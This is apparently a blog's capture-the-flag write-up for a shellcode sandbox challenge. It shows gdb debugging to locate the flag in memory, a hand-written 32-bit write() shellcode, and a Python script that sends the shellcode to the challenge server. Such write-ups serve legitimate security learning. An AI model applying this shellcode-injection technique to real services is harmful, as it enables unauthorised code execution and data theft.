<p>I started binary via <code>socat</code> to test locally. First, let&rsquo;s see what we have to work with, by sending a single <code>0xcc</code> (<code>INT 3</code>) via a python script:</p>

<pre><code class="python">import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('localhost', 5555))

raw_input()
s.send("\xcc")

print s.recv(256)
s.close()
</code></pre>

<p>The <code>raw_input()</code> serves to halt the binary, given us the chance to attach gdb with</p>

<pre><code class="bash">$ gdb -pid `pgrep sbox`
</code></pre>

<p>After attaching, I entered &lsquo;c&rsquo; to continue execution. Then the binary crashes upon hitting the <code>INT 3</code>. The registers look like this, flag is in the same mmapped region:</p>

<pre><code>0xb77c6002 in ?? ()
gdb-peda$ i r
eax            0xb77c6000    0xb77c6000
ecx            0xb77c6000    0xb77c6000
edx            0x2000    0x2000
ebx            0xb77a5ff4    0xb77a5ff4
esp            0xbf9eff0c    0xbf9eff0c
ebp            0xbf9eff58    0xbf9eff58
esi            0x0    0x0
edi            0x0    0x0
eip            0xb77c6002    0xb77c6002
eflags         0x207    [ CF PF IF ]
cs             0x73    0x73
ss             0x7b    0x7b
ds             0x7b    0x7b
es             0x7b    0x7b
fs             0x0    0x0
gs             0x33    0x33
gdb-peda$ find "FLAG"
Searching for 'FLAG' in: None ranges
Found 2 results, display max 2 items:
    mapped : 0xb77c8000 ("FLAG\n")
</code></pre>

<p>I whipped up some &lsquo;shellcode&rsquo; (if you can call it that). We can use the values of the registers in our shellcode to write the flag to STDOUT. For instance, <code>ecx</code> already points to the shellcode. We just have to add <code>0x2000</code> to it to get the address of the flag!</p>

<pre><code>bits 32

push 0x20     # 
pop ebx       # pop 0x20 in ebx
shl ebx, 8    # ebx is now 0x2000
              # adjust ecx so that it points to flag in memory
add ecx, ebx  # ecx = buffer
xor ebx, ebx  # ebx = fd
inc ebx       # STDOUT; STDERR also works
xor edx, edx  # edx = count
mov dl, 0xff  # write out 255 bytes
push 4        # eax = syscall
pop eax       # eax = write
int 0x80      # get flag!
</code></pre>

<p>I avoided null-bytes, just in case. The shellcode was compiled with</p>

<pre><code class="bash">$ nasm -f bin ./shellcode.asm
</code></pre>

<p>I had issues with <code>radare2</code> not recognizing some opcodes (need to look into that!), which is why I switched to <code>nasm</code>. Using a modified version of the earlier python code, I sent the shellcode over to the server:</p>

<pre><code class="python">import socket
import time

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('54.163.248.69',9001))

with open('shellcode') as f:
    data = f.read()
    s.send(data)

print s.recv(256)
s.close()
</code></pre>

<p>The result:</p>

<pre><code class="bash">$ python sploit.py
d3sp3r4t3_sh3llc0d3
</code></pre>

<p>The flag was <code>d3sp3r4t3_sh3llc0d3</code>.</p>
]]></content>
  </entry>
  
</feed>
